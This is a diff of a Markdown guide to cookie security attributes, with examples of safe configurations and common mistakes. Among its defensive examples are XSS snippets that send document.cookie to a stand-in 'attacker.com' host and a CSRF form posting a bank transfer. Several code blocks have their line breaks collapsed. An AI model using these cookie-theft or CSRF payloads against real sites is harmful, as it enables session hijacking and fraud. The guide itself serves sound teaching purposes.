@@ -17,10 +17,10 @@ Cookies are name-value pairs sent by the server via the `Set-Cookie` header and 
 ### Why Cookie Security Matters
 
 Improperly configured cookies can lead to:
-- **Session hijacking**: Attackers stealing session tokens
-- **Cross-Site Scripting (XSS)**: Malicious scripts accessing sensitive cookies
-- **Cross-Site Request Forgery (CSRF)**: Unauthorized actions using user’s cookies
-- **Man-in-the-Middle (MitM) attacks**: Interception of cookies over insecure connections
+- Session hijacking: Attackers stealing session tokens
+- Cross-Site Scripting (XSS): Malicious scripts accessing sensitive cookies
+- Cross-Site Request Forgery (CSRF): Unauthorized actions using user's cookies
+- Man-in-the-Middle (MitM) attacks: Interception of cookies over insecure connections
 
 ---
 
@@ -28,25 +28,25 @@ Improperly configured cookies can lead to:
 
 ### Definition
 
-The `HttpOnly` attribute prevents client-side JavaScript from accessing the cookie through `document.cookie` or other DOM APIs. This attribute is crucial for protecting sensitive cookies from XSS attacks.
+The `HttpOnly` attribute prevents client-side JavaScript from accessing the cookie through `document.cookie` or other DOM APIs. XSS can still run in the page and call your APIs as the user. The flag only keeps the cookie value out of script.
 
 ### ⚠️ CRITICAL: HttpOnly Does NOT Protect Against CSRF
 
-**Important Clarification:**
-- ✅ HttpOnly **protects against XSS** (Cross-Site Scripting)
-- ❌ HttpOnly **does NOT protect against CSRF** (Cross-Site Request Forgery)
+Important Clarification:
+- HttpOnly keeps the cookie value out of JavaScript. That limits theft during XSS. It does not stop XSS.
+- HttpOnly does not protect against CSRF (Cross-Site Request Forgery)
 
 These are two completely different attack vectors. See `CRITICAL_CLARIFICATION` below for detailed explanation.
 
-[**Critical Clarification: HttpOnly vs CSRF Protection**](Critical%20Clarification%20HttpOnly%20vs%20CSRF%20Protection.md)
+[Critical Clarification: HttpOnly vs CSRF Protection](Critical%20Clarification%20HttpOnly%20vs%20CSRF%20Protection.md)
 
 ### How It Works
 
 When a cookie has the `HttpOnly` flag:
 - ✅ The cookie is sent with HTTP requests automatically
 - ✅ Server-side code can read and write the cookie
-- ❌ JavaScript cannot access the cookie via `document.cookie`
-- ❌ Browser extensions cannot access the cookie (in most cases)
+- Page script cannot read the cookie via `document.cookie`
+- An extension with the browser's cookie permission can still read it
 
 ### Syntax
 
@@ -61,7 +61,7 @@ Set-Cookie: sessionId=abc123; HttpOnly
 // Attacker's XSS script can steal the cookie<script>  fetch('https://attacker.com/steal?cookie=' + document.cookie);</script>
 ```
 
-### Example: With HttpOnly (Protected from XSS)
+### Example: With HttpOnly (script cannot read the value)
 
 ```jsx
 // Server sets cookie with HttpOnlySet-Cookie: sessionId=abc123; HttpOnly
@@ -77,13 +77,13 @@ Set-Cookie: sessionId=abc123; HttpOnly
 
 ### When to Use HttpOnly
 
-**Always use HttpOnly for:**
+Always use HttpOnly for:
 - Session tokens
 - Authentication cookies
 - CSRF tokens (to prevent XSS from stealing them)
 - Any sensitive data stored in cookies
 
-**You can skip HttpOnly for:**
+You can skip HttpOnly for:
 - Client-side only cookies (e.g., UI preferences)
 - Cookies that need JavaScript access (use with caution)
 
@@ -138,14 +138,14 @@ Cookie: sessionId=abc123  // Sent over encrypted connection
 
 ### When to Use Secure
 
-**Always use Secure for:**
+Always use Secure for:
 - All cookies containing sensitive data
 - Session cookies
 - Authentication tokens
 - Any cookie in production environments
 - Cookies with `SameSite=None` (required by modern browsers)
 
-**Exception:**
+Exception:
 - Development environments using HTTP (but use HTTPS in production)
 
 ### Important Notes
@@ -157,10 +157,10 @@ Cookie: sessionId=abc123  // Sent over encrypted connection
 
 ### Browser Behavior
 
-- **Chrome/Edge**: Requires `Secure` for `SameSite=None` cookies
-- **Firefox**: Requires `Secure` for `SameSite=None` cookies
-- **Safari**: Requires `Secure` for `SameSite=None` cookies
-- **All browsers**: Will not send `Secure` cookies over HTTP
+- Chrome/Edge: Requires `Secure` for `SameSite=None` cookies
+- Firefox: Requires `Secure` for `SameSite=None` cookies
+- Safari: Requires `Secure` for `SameSite=None` cookies
+- All browsers: Will not send `Secure` cookies over HTTP
 
 ---
 
@@ -168,34 +168,34 @@ Cookie: sessionId=abc123  // Sent over encrypted connection
 
 ### Definition
 
-The `SameSite` attribute controls whether cookies are sent with cross-site requests, providing protection against CSRF attacks. It’s one of the most important modern cookie security features.
+The `SameSite` attribute controls whether cookies are sent with cross-site requests, providing protection against CSRF attacks. It's one of the most important modern cookie security features.
 
 ### ⚠️ This is What Actually Protects Against CSRF
 
-Unlike HttpOnly, the `SameSite` attribute **does protect against CSRF attacks** by controlling when cookies are sent with requests.
+Unlike HttpOnly, the `SameSite` attribute does protect against CSRF attacks by controlling when cookies are sent with requests.
 
 ### Values
 
 ### 1. SameSite=Strict
 
-**Behavior:**
+Behavior:
 - Cookie is sent ONLY with same-site requests
 - Cookie is NOT sent with any cross-site requests, including top-level navigations
 - Maximum CSRF protection
 
-**Use Cases:**
+Use Cases:
 - Banking applications
 - Administrative panels
 - High-security applications
 - When user experience allows for re-authentication
 
-**Example:**
+Example:
 
 ```
 Set-Cookie: sessionId=abc123; SameSite=Strict; Secure; HttpOnly
 ```
 
-**Scenario:**
+Scenario:
 
 ```
 User clicks link from email: https://bank.com/transfer?to=attacker&amount=1000
@@ -205,25 +205,25 @@ User must log in again (better security, but may impact UX)
 
 ### 2. SameSite=Lax (Default in Modern Browsers)
 
-**Behavior:**
+Behavior:
 - Cookie is sent with same-site requests
 - Cookie is sent with top-level GET navigations (e.g., clicking a link)
 - Cookie is NOT sent with cross-site POST requests, iframes, images, or AJAX calls
 - Good balance between security and usability
 
-**Use Cases:**
+Use Cases:
 - Most web applications (recommended default)
 - E-commerce sites
 - Social media platforms
 - When you want CSRF protection without breaking external links
 
-**Example:**
+Example:
 
 ```
 Set-Cookie: sessionId=abc123; SameSite=Lax; Secure; HttpOnly
 ```
 
-**Scenario:**
+Scenario:
 
 ```
 User clicks link from email: https://shop.com/product/123
@@ -240,47 +240,47 @@ CSRF attack prevented
 
 ### 3. SameSite=None
 
-**Behavior:**
+Behavior:
 - Cookie is sent with both same-site and cross-site requests
-- **REQUIRES** the `Secure` attribute
+- REQUIRES the `Secure` attribute
 - Used for third-party integrations
 
-**Use Cases:**
+Use Cases:
 - Embedded widgets (e.g., payment processors)
 - OAuth flows
 - Cross-origin API calls
 - Third-party authentication
 
-**Example:**
+Example:
 
 ```
 Set-Cookie: sessionId=abc123; SameSite=None; Secure; HttpOnly
 ```
 
-**Important:**
+Important:
 - Must be used with `Secure` attribute
 - Some browsers block third-party cookies by default
 - Consider alternatives like OAuth2 or token-based auth
 
 ### SameSite Default Behavior
 
-**Modern Browsers (2020+):**
+Modern Browsers (2020+):
 - Chrome 80+, Edge 80+, Firefox 69+, Safari 13+
 - Default to `SameSite=Lax` if not specified
 - Legacy behavior was `SameSite=None`
 
-**Legacy Browsers:**
+Legacy Browsers:
 - Treat missing `SameSite` as `None`
 - May send cookies with all requests
 
-**Best Practice:**
+Best Practice:
 Always explicitly set `SameSite` to avoid relying on browser defaults.
 
 ### SameSite and CSRF Protection
 
-**How SameSite Prevents CSRF:**
+How SameSite Prevents CSRF:
 
-1. **Strict Mode:**
+1. Strict Mode:
     
     ```
     Attacker's site: evil.com
@@ -296,14 +296,14 @@ Always explicitly set `SameSite` to avoid relying on browser defaults.
     Attack fails
     ```
     
-2. **Lax Mode:**
+2. Lax Mode:
     
     ```
     Same scenario as above - cookie not sent with POST
     But cookie IS sent when user clicks link (GET navigation)
     ```
     
-3. **None Mode:**
+3. None Mode:
     
     ```
     Cookie IS sent - no CSRF protection
@@ -319,16 +319,16 @@ Cookie prefixes (`__Secure-` and `__Host-`) provide additional security by enfor
 
 ### __Secure- Prefix
 
-**Requirements:**
+Requirements:
 - Cookie name must start with `__Secure-`
 - Must have `Secure` attribute
 - Must be set from secure (HTTPS) origin
 
-**Purpose:**
+Purpose:
 - Prevents accidental insecure cookie setting
 - Enforces secure transmission
 
-**Example:**
+Example:
 
 ```
 // ✅ Valid
@@ -342,7 +342,7 @@ Set-Cookie: __Secure-sessionId=abc123; HttpOnly
 // Browser will reject if set from non-HTTPS origin
 ```
 
-**Use Case:**
+Use Case:
 
 ```jsx
 // Server coderes.cookie('__Secure-sessionId', sessionToken, {
@@ -351,19 +351,19 @@ Set-Cookie: __Secure-sessionId=abc123; HttpOnly
 
 ### __Host- Prefix
 
-**Requirements:**
+Requirements:
 - Cookie name must start with `__Host-`
 - Must have `Secure` attribute
 - Must have `Path=/`
 - Must NOT have `Domain` attribute
 - Must be set from secure (HTTPS) origin
 
-**Purpose:**
+Purpose:
 - Prevents subdomain cookie access
 - Prevents path-based cookie scope issues
 - Maximum isolation
 
-**Example:**
+Example:
 
 ```
 // ✅ Valid
@@ -378,13 +378,13 @@ Set-Cookie: __Host-sessionId=abc123; Secure; Path=/api; HttpOnly
 // Browser will reject
 ```
 
-**Use Case:**
+Use Case:
 
 ```jsx
 // Prevents cookie from being accessible to subdomains// example.com sets: __Host-sessionId=abc123// subdomain.example.com CANNOT access this cookie
 ```
 
-**Security Benefits:**
+Security Benefits:
 - Prevents subdomain takeover attacks
 - Prevents cookie scope confusion
 - Ensures cookie is only for the exact host
@@ -395,16 +395,16 @@ Set-Cookie: __Host-sessionId=abc123; Secure; Path=/api; HttpOnly
 
 ### Domain Attribute
 
-**Purpose:**
+Purpose:
 Controls which domains can receive the cookie.
 
-**Syntax:**
+Syntax:
 
 ```
 Set-Cookie: sessionId=abc123; Domain=example.com
 ```
 
-**Behavior:**
+Behavior:
 - If `Domain` is set to `example.com`, cookie is sent to:
 - `example.com`
 - `www.example.com`
@@ -415,7 +415,7 @@ Set-Cookie: sessionId=abc123; Domain=example.com
     - The exact host that set it
     - Not to subdomains
 
-**Security Considerations:**
+Security Considerations:
 
 ```
 // ⚠️ Risky - too broad
@@ -433,20 +433,20 @@ Set-Cookie: __Host-sessionId=abc123; Secure; Path=/
 
 ### Path Attribute
 
-**Purpose:**
+Purpose:
 Controls which URL paths can access the cookie.
 
-**Syntax:**
+Syntax:
 
 ```
 Set-Cookie: sessionId=abc123; Path=/api
 ```
 
-**Behavior:**
+Behavior:
 - Cookie is sent only for requests to paths matching the specified path
 - Path matching is prefix-based
 
-**Examples:**
+Examples:
 
 ```
 Set-Cookie: sessionId=abc123; Path=/
@@ -465,17 +465,17 @@ Set-Cookie: sessionId=abc123; Path=/api
 // ❌ https://example.com/
 ```
 
-**Security Considerations:**
+Security Considerations:
 - Use most restrictive path possible
 - Default is the path of the document setting the cookie
 - For session cookies, typically use `Path=/`
 
 ### Expires and Max-Age Attributes
 
-**Purpose:**
+Purpose:
 Control when the cookie expires and is deleted.
 
-**Expires:**
+Expires:
 
 ```
 Set-Cookie: sessionId=abc123; Expires=Wed, 21 Oct 2025 07:28:00 GMT
@@ -483,9 +483,9 @@ Set-Cookie: sessionId=abc123; Expires=Wed, 21 Oct 2025 07:28:00 GMT
 
 - Absolute expiration date/time
 - Must be in GMT format
-- If not set, cookie is a “session cookie” (deleted when browser closes)
+- If not set, cookie is a "session cookie" (deleted when browser closes)
 
-**Max-Age:**
+Max-Age:
 
 ```
 Set-Cookie: sessionId=abc123; Max-Age=3600
@@ -495,13 +495,13 @@ Set-Cookie: sessionId=abc123; Max-Age=3600
 - More convenient than `Expires`
 - If both are set, `Max-Age` takes precedence
 
-**Security Best Practices:**
+Security Best Practices:
 - Set short expiration times for sensitive cookies
 - Use session cookies (no expiration) for temporary data
 - Implement server-side session expiration
 - Rotate session tokens periodically
 
-**Example:**
+Example:
 
 ```jsx
 // Session cookie (deleted when browser closes)Set-Cookie: sessionId=abc123; HttpOnly; Secure
@@ -518,7 +518,7 @@ Set-Cookie: sessionId=abc123; Max-Age=3600
 Set-Cookie: __Host-sessionId=abc123; Secure; HttpOnly; SameSite=Strict; Path=/; Max-Age=3600
 ```
 
-**Why this configuration:**
+Why this configuration:
 - `__Host-` prefix: Prevents subdomain access
 - `Secure`: Only over HTTPS
 - `HttpOnly`: No JavaScript access (XSS protection)
@@ -532,7 +532,7 @@ Set-Cookie: __Host-sessionId=abc123; Secure; HttpOnly; SameSite=Strict; Path=/; 
 Set-Cookie: __Secure-authToken=xyz789; Secure; HttpOnly; SameSite=Lax; Path=/; Max-Age=86400
 ```
 
-**Why this configuration:**
+Why this configuration:
 - `__Secure-` prefix: Enforces secure transmission
 - `Secure`: Only over HTTPS
 - `HttpOnly`: No JavaScript access (XSS protection)
@@ -546,7 +546,7 @@ Set-Cookie: __Secure-authToken=xyz789; Secure; HttpOnly; SameSite=Lax; Path=/; M
 Set-Cookie: __Secure-widgetSession=def456; Secure; HttpOnly; SameSite=None; Path=/; Max-Age=1800
 ```
 
-**Why this configuration:**
+Why this configuration:
 - `__Secure-` prefix: Enforces secure transmission
 - `Secure`: Required for `SameSite=None`
 - `HttpOnly`: No JavaScript access (XSS protection)
@@ -611,49 +611,49 @@ using Microsoft.AspNetCore.Http;public IActionResult Login(){    var sessionToke
 
 ### HttpOnly Support
 
-- ✅ **All modern browsers**: Full support
-- ✅ **IE 6+**: Supported
-- ✅ **Mobile browsers**: Full support
+- ✅ All modern browsers: Full support
+- ✅ IE 6+: Supported
+- ✅ Mobile browsers: Full support
 
 ### Secure Support
 
-- ✅ **All modern browsers**: Full support
-- ✅ **IE 6+**: Supported
-- ✅ **Mobile browsers**: Full support
+- ✅ All modern browsers: Full support
+- ✅ IE 6+: Supported
+- ✅ Mobile browsers: Full support
 
 ### SameSite Support
 
-- ✅ **Chrome 51+**: Full support
-- ✅ **Firefox 60+**: Full support
-- ✅ **Safari 12+**: Full support (with some quirks in older versions)
-- ✅ **Edge 79+**: Full support
-- ⚠️ **IE 11**: Not supported
-- ⚠️ **Older browsers**: Not supported (default to None behavior)
+- ✅ Chrome 51+: Full support
+- ✅ Firefox 60+: Full support
+- ✅ Safari 12+: Full support (with some quirks in older versions)
+- ✅ Edge 79+: Full support
+- ⚠️ IE 11: Not supported
+- ⚠️ Older browsers: Not supported (default to None behavior)
 
 ### Cookie Prefixes Support
 
-- ✅ **Chrome 49+**: `__Secure-` and `__Host-` support
-- ✅ **Firefox 50+**: `__Secure-` and `__Host-` support
-- ✅ **Safari 12+**: `__Secure-` and `__Host-` support
-- ✅ **Edge 79+**: `__Secure-` and `__Host-` support
-- ⚠️ **IE 11**: Not supported (prefixes ignored, but cookies still work)
+- ✅ Chrome 49+: `__Secure-` and `__Host-` support
+- ✅ Firefox 50+: `__Secure-` and `__Host-` support
+- ✅ Safari 12+: `__Secure-` and `__Host-` support
+- ✅ Edge 79+: `__Secure-` and `__Host-` support
+- ⚠️ IE 11: Not supported (prefixes ignored, but cookies still work)
 
 ### Testing Cookie Attributes
 
-**Browser DevTools:**
+Browser DevTools:
 1. Open DevTools (F12)
 2. Go to Application/Storage tab
 3. Click Cookies
 4. View cookie attributes
 
-**Command Line (curl):**
+Command Line (curl):
 
 ```bash
 # Check Set-Cookie headercurl -I https://example.com/login
 # Check if cookie is sentcurl -v -H "Cookie: sessionId=abc123" https://example.com/api
 ```
 
-**Online Tools:**
+Online Tools:
 - SecurityHeaders.com
 - Cookie-Editor browser extension
 - Browser DevTools Network tab
@@ -664,14 +664,14 @@ using Microsoft.AspNetCore.Http;public IActionResult Login(){    var sessionToke
 
 ### 1. Missing HttpOnly (XSS Vulnerability)
 
-**Vulnerability:**
+Vulnerability:
 
 ```jsx
 // Cookie set without HttpOnlySet-Cookie: sessionId=abc123
 // XSS attack<script>  document.location = 'https://attacker.com/steal?cookie=' + document.cookie;</script>
 ```
 
-**Mitigation:**
+Mitigation:
 
 ```jsx
 // Always use HttpOnly for sensitive cookiesSet-Cookie: sessionId=abc123; HttpOnly
@@ -679,14 +679,14 @@ using Microsoft.AspNetCore.Http;public IActionResult Login(){    var sessionToke
 
 ### 2. Missing Secure (MitM Vulnerability)
 
-**Vulnerability:**
+Vulnerability:
 
 ```jsx
 // Cookie set without SecureSet-Cookie: sessionId=abc123; HttpOnly
 // Attacker on same network intercepts HTTP traffic// Cookie sent in plaintext, can be stolen
 ```
 
-**Mitigation:**
+Mitigation:
 
 ```jsx
 // Always use Secure in productionSet-Cookie: sessionId=abc123; HttpOnly; Secure
@@ -694,30 +694,30 @@ using Microsoft.AspNetCore.Http;public IActionResult Login(){    var sessionToke
 
 ### 3. Missing SameSite (CSRF Vulnerability)
 
-**Vulnerability:**
+Vulnerability:
 
 ```jsx
 // Cookie set without SameSiteSet-Cookie: sessionId=abc123; HttpOnly; Secure
 // CSRF attack// Attacker's site: evil.com<form action="https://bank.com/transfer" method="POST">  <input name="to" value="attacker">  <input name="amount" value="10000"></form>// Cookie sent with cross-site request
 ```
 
-**Mitigation:**
+Mitigation:
 
 ```jsx
 // Use SameSite=Strict or LaxSet-Cookie: sessionId=abc123; HttpOnly; Secure; SameSite=Strict
 ```
 
-**Note:** HttpOnly does NOT prevent this CSRF attack. Only SameSite (or CSRF tokens) can prevent it.
+Note: HttpOnly does NOT prevent this CSRF attack. Only SameSite (or CSRF tokens) can prevent it.
 
 ### 4. Overly Broad Domain (Subdomain Attack)
 
-**Vulnerability:**
+Vulnerability:
 
 ```jsx
 // Cookie set with broad domainSet-Cookie: sessionId=abc123; Domain=.example.com// If subdomain.example.com is compromised// Attacker can access the cookie
 ```
 
-**Mitigation:**
+Mitigation:
 
 ```jsx
 // Don't set Domain, or use __Host- prefixSet-Cookie: __Host-sessionId=abc123; Secure; HttpOnly; Path=/
@@ -725,14 +725,14 @@ using Microsoft.AspNetCore.Http;public IActionResult Login(){    var sessionToke
 
 ### 5. Long-Lived Cookies (Session Fixation)
 
-**Vulnerability:**
+Vulnerability:
 
 ```jsx
 // Cookie with very long expirationSet-Cookie: sessionId=abc123; Expires=Wed, 21 Oct 2030 07:28:00 GMT
 // If stolen, remains valid for years
 ```
 
-**Mitigation:**
+Mitigation:
 
 ```jsx
 // Use short expiration timesSet-Cookie: sessionId=abc123; Max-Age=3600  // 1 hour// Implement server-side session rotation// Regenerate session ID periodically
@@ -740,14 +740,14 @@ using Microsoft.AspNetCore.Http;public IActionResult Login(){    var sessionToke
 
 ### 6. SameSite=None Without Secure
 
-**Vulnerability:**
+Vulnerability:
 
 ```jsx
 // SameSite=None without Secure (invalid, but some servers allow)Set-Cookie: sessionId=abc123; SameSite=None
 // Modern browsers reject this, but legacy behavior may differ
 ```
 
-**Mitigation:**
+Mitigation:
 
 ```jsx
 // Always use Secure with SameSite=NoneSet-Cookie: sessionId=abc123; SameSite=None; Secure
@@ -755,13 +755,13 @@ using Microsoft.AspNetCore.Http;public IActionResult Login(){    var sessionToke
 
 ### 7. Cookie Theft via Document.cookie
 
-**Vulnerability:**
+Vulnerability:
 
 ```jsx
 // Cookie accessible via JavaScriptSet-Cookie: sessionId=abc123  // Missing HttpOnly// Any script can access itvar cookie = document.cookie;
 ```
 
-**Mitigation:**
+Mitigation:
 
 ```jsx
 // Use HttpOnlySet-Cookie: sessionId=abc123; HttpOnly
@@ -774,19 +774,19 @@ using Microsoft.AspNetCore.Http;public IActionResult Login(){    var sessionToke
 
 ### Scenario 1: E-Commerce Session Management
 
-**Requirements:**
+Requirements:
 - User stays logged in while browsing
 - Session persists across page navigations
 - Protection against XSS and CSRF
 - Good user experience
 
-**Solution:**
+Solution:
 
 ```jsx
 Set-Cookie: __Secure-sessionId=abc123; Secure; HttpOnly; SameSite=Lax; Path=/; Max-Age=86400
 ```
 
-**Why:**
+Why:
 - `__Secure-` prefix: Enforces secure transmission
 - `Secure`: HTTPS only
 - `HttpOnly`: XSS protection
@@ -795,91 +795,91 @@ Set-Cookie: __Secure-sessionId=abc123; Secure; HttpOnly; SameSite=Lax; Path=/; M
 
 ### Scenario 2: Banking Application
 
-**Requirements:**
+Requirements:
 - Maximum security
 - No cross-site cookie transmission
 - User can re-authenticate if needed
 
-**Solution:**
+Solution:
 
 ```jsx
 Set-Cookie: __Host-sessionId=abc123; Secure; HttpOnly; SameSite=Strict; Path=/; Max-Age=1800
 ```
 
-**Why:**
+Why:
 - `__Host-` prefix: Maximum isolation, no subdomain access
 - `SameSite=Strict`: No cross-site requests (CSRF protection)
 - `Max-Age=1800`: 30-minute session (shorter for security)
 
 ### Scenario 3: OAuth/SSO Integration
 
-**Requirements:**
+Requirements:
 - Cross-origin cookie transmission
 - Third-party authentication
 - Secure transmission
 
-**Solution:**
+Solution:
 
 ```jsx
 Set-Cookie: __Secure-oauthState=xyz789; Secure; HttpOnly; SameSite=None; Path=/; Max-Age=600
 ```
 
-**Why:**
+Why:
 - `SameSite=None`: Allows cross-origin requests
 - `Secure`: Required for `SameSite=None`
 - `Max-Age=600`: Short-lived (10 minutes) for OAuth state
-- **Note:** No CSRF protection from SameSite, must use CSRF tokens
+- Note: No CSRF protection from SameSite, must use CSRF tokens
 
 ### Scenario 4: Multi-Tenant SaaS Application
 
-**Requirements:**
+Requirements:
 - Cookies scoped to specific tenant
 - No cross-tenant cookie access
 - Subdomain isolation
 
-**Solution:**
+Solution:
 
 ```jsx
 // For tenant1.example.comSet-Cookie: __Host-tenant-sessionId=abc123; Secure; HttpOnly; SameSite=Lax; Path=/// For tenant2.example.comSet-Cookie: __Host-tenant-sessionId=def456; Secure; HttpOnly; SameSite=Lax; Path=/
 ```
 
-**Why:**
+Why:
 - `__Host-` prefix: Prevents subdomain access
 - Each tenant gets isolated cookies
 - No `Domain` attribute ensures host-specific scope
 
 ### Scenario 5: API Authentication
 
-**Requirements:**
+Requirements:
 - RESTful API authentication
 - Mobile app and web app support
 - Token-based authentication
 
-**Solution:**
+Solution:
 
 ```jsx
 // Option 1: Cookie-based (for web)Set-Cookie: __Secure-apiToken=xyz789; Secure; HttpOnly; SameSite=Strict; Path=/api; Max-Age=3600// Option 2: Token in Authorization header (for mobile)// More appropriate for APIs, but cookies can work too
 ```
 
-**Why:**
+Why:
 - `Path=/api`: Scoped to API endpoints
 - `SameSite=Strict`: Maximum security for API
 - Consider using Bearer tokens instead for APIs
 
 ### Scenario 6: Remember Me Functionality
 
-**Requirements:**
+Requirements:
 - Long-lived authentication
 - Persistent login
 - Secure storage
 
-**Solution:**
+Solution:
 
 ```jsx
 // Remember me token (long-lived, but separate from session)Set-Cookie: __Secure-rememberToken=longlived123; Secure; HttpOnly; SameSite=Lax; Path=/; Max-Age=2592000// Regular session (short-lived)Set-Cookie: __Secure-sessionId=abc123; Secure; HttpOnly; SameSite=Lax; Path=/; Max-Age=3600
 ```
 
-**Why:**
+Why:
 - Separate tokens for different purposes
 - Remember token can be longer-lived
 - Session token should be short-lived
@@ -891,7 +891,7 @@ Set-Cookie: __Secure-oauthState=xyz789; Secure; HttpOnly; SameSite=None; Path=/;
 
 ### 1) Partitioned cookies (CHIPS) for embedded contexts
 
-Modern browsers support **partitioned cookies** for some third-party scenarios so state is isolated per top-level site.
+Modern browsers support partitioned cookies for some third-party scenarios so state is isolated per top-level site.
 
 Example concept:
 
@@ -899,7 +899,7 @@ Example concept:
 Set-Cookie: __Secure-widgetSession=<token>; Secure; HttpOnly; SameSite=None; Partitioned; Path=/
 ```
 
-Why this matters:
+What you get:
 
 - Reduces cross-site tracking and cross-tenant state bleed for embedded widgets
 - Safer than unrestricted third-party cookie behavior
@@ -935,17 +935,17 @@ Interview shorthand: "Cookie attributes reduce theft probability; rotation and t
 
 ### Essential Cookie Security Checklist
 
-✅ **Always use for sensitive cookies:**
+✅ Always use for sensitive cookies:
 - `HttpOnly`: Prevents JavaScript access (XSS protection)
 - `Secure`: HTTPS only transmission
 - `SameSite`: CSRF protection (Strict or Lax)
 
-✅ **Consider using:**
+✅ Consider using:
 - `__Host-` or `__Secure-` prefix: Additional security enforcement
 - Short `Max-Age`: Limit exposure window
 - Restrictive `Path`: Minimize scope
 
-✅ **Avoid:**
+✅ Avoid:
 - Setting `Domain` unless necessary
 - Long expiration times
 - `SameSite=None` without `Secure`
@@ -965,19 +965,19 @@ Interview shorthand: "Cookie attributes reduce theft probability; rotation and t
 
 ### Final Recommendations
 
-1. **Default Configuration:**
+1. Default Configuration:
     
     ```
     Set-Cookie: __Secure-sessionId=<token>; Secure; HttpOnly; SameSite=Lax; Path=/; Max-Age=3600
     ```
     
-2. **High Security Configuration:**
+2. High Security Configuration:
     
     ```
     Set-Cookie: __Host-sessionId=<token>; Secure; HttpOnly; SameSite=Strict; Path=/; Max-Age=1800
     ```
     
-3. **Third-Party Configuration:**
+3. Third-Party Configuration:
     
     ```
     Set-Cookie: __Secure-widgetId=<token>; Secure; HttpOnly; SameSite=None; Path=/; Max-Age=1800
@@ -986,10 +986,10 @@ Interview shorthand: "Cookie attributes reduce theft probability; rotation and t
 
 ### Key Takeaways
 
-1. **HttpOnly protects against XSS, NOT CSRF**
-2. **SameSite protects against CSRF**
-3. **Secure ensures HTTPS-only transmission**
-4. **Use all three together for maximum security**
-5. **Cookie prefixes add additional enforcement**
+1. HttpOnly stops JavaScript from reading the cookie. It does not stop CSRF, and it does not stop an XSS payload from calling your APIs.
+2. SameSite protects against CSRF
+3. Secure ensures HTTPS-only transmission
+4. Use all three together for maximum security
+5. Cookie prefixes add additional enforcement
 
 Remember: Cookie security is just one layer of defense. Always implement defense-in-depth with proper authentication, authorization, input validation, and other security measures.
